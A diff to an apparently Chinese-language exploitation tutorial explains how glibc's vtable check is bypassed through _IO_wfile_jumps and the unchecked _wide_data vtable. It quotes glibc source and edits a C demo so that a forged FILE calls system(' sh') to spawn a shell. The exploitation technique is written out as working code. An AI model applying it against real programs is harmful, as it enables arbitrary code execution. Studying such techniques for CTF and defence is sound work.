@@ -668,12 +668,73 @@ p.interactive()
 
 前面提到，libc 在结束进程前，会遍历 `_IO_list_all` 链表，每个 FILE 的缓冲区是否还有内容：如果检查 `fp->_IO_write_ptr > fp->_IO_write_base` 或者 `_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)` 成立，就说明还有数据没有通过 write syscall 写出去，这时候就会调用 overflow hook 函数来做这件事情。overflow hook 本身保存在 vtable 中，而 vtable 受到了保护，在 `IO_validate_vtable` 函数中检查它是否合法，即是否为 glibc 自带的 vtable，此时如果用自己构造的 vtable，就会出现 `Fatal error: glibc detected an invalid stdio handle` 错误。
 
-既然不能用 glibc 以外的 vtable，这时候可以利用 glibc 自带的另一个 vtable：`IO_wfile_jumps`，它的 `overflow` 函数指向了 `_IO_wfile_overflow`，而这个函数在一些条件下会调用 `_IO_wdoallocbuf` 进而调用 `_IO_WDOALLOCATE`，此时它会从 `_wide_data` 字段读取 vtable，这个 vtable 是没有检查的，所以可以攻击。演示代码如下：
+虽然不能用 glibc 以外的 vtable，但这时候可以利用 glibc 自带的另一个 vtable：`IO_wfile_jumps`，它的 `overflow` 函数指向了 `_IO_wfile_overflow`：
+
+```c
+const struct _IO_jump_t _IO_wfile_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_new_file_finish),
+  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
+  /* omitted */
+};
+```
+
+而 `_IO_wfile_overflow` 函数在一些条件下会调用 `_IO_wdoallocbuf`：
+
+```c
+wint_t
+_IO_wfile_overflow (FILE *f, wint_t wch)
+{
+  if (f->_flags & _IO_NO_WRITES)
+    {
+      /* omitted */
+      return WEOF;
+    }
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
+    {
+      if (f->_wide_data->_IO_write_base == 0)
+        {
+          _IO_wdoallocbuf (f);
+          /* omitted */
+        }
+    }
+  /* omitted */
+}
+```
+
+`_IO_wallocbuf` 进而会调用 `_IO_WDOALLOCATE`：
+
+```c
+void
+_IO_wdoallocbuf (FILE *fp)
+{
+  if (fp->_wide_data->_IO_buf_base)
+    return;
+  if (!(fp->_flags & _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
+      return;
+  /* omitted */
+}
+```
+
+`_IO_WDOALLOCATE` 被定义为：
+
+```c
+#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
+#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
+#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
+#define _IO_WIDE_JUMPS(THIS) \
+  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
+```
+
+也就是说，它会从 `_wide_data` 字段读取 vtable，调用这个 vtable 中的 __doallocate 字段指向的函数。而这个 vtable 是没有检查的，所以可以攻击它。具体地，把 `_wide_data->_wide_vtable->__doallocate` 指向 `system`，那么 `_IO_WDOALLOCATE (fp)` 就相当于调用了 `system(fp)`，这时候再把 fp 伪造成一个执行 shell 的命令，就实现了 get shell。演示代码如下：
 
 ```c
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 
 #define JUMP_FIELD(TYPE, NAME) void *NAME
 
@@ -751,8 +812,6 @@ struct _IO_wide_data {
   const struct _IO_jump_t *_wide_vtable;
 };
 
-void get_shell() { system("/bin/sh"); }
-
 int main() {
   // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
   // _IO_2_1_stdin_
@@ -775,10 +834,18 @@ int main() {
   // & _IO_CURRENTLY_PUTTING) == 0 && _wide_data->_IO_write_base == 0
   // 3. required in _IO_wdoallocbuf: _wide_data->_IO_buf_base == 0 && (flags &
   // _IO_UNBUFFERED) == 0
+  // doallocate is called with fake_file as its first argument,
+  // we want it to be equivalent to system("/bin/sh").
+  // therefore the _flags fields should pass the conditions above,
+  // and also appears as a string to launch sh.
+  // _IO_NO_WRITES is 0x0008, _IO_CURRENTLY_PUTTING is 0x0800,
+  // _IO_UNBUFFERED is 0x0002.
+  // we can handle these bit fields by adding one space (0x20)
+  char *flags = (char *)&fake_file->file._flags;
+  strcpy(flags, " sh"); // 0x20, 0x73, 0x68, 0x00
   fake_file->file._mode = 0;
   fake_file->file._IO_write_ptr = (char *)1;
   fake_file->file._IO_write_base = (char *)0;
-  fake_file->file._flags = 0;
   fake_file->file._wide_data =
       (struct _IO_wide_data *)malloc(sizeof(struct _IO_wide_data));
   fake_file->file._wide_data->_IO_write_base = 0;
@@ -786,7 +853,7 @@ int main() {
 
   // doallocate is called within _IO_wdoallocbuf
   struct _IO_jump_t *wide_vtable = malloc(sizeof(struct _IO_jump_t));
-  wide_vtable->__doallocate = get_shell;
+  wide_vtable->__doallocate = system;
   fake_file->file._wide_data->_wide_vtable = wide_vtable;
 
   // use IO_wfile_jumps as vtable to pass vtable validation
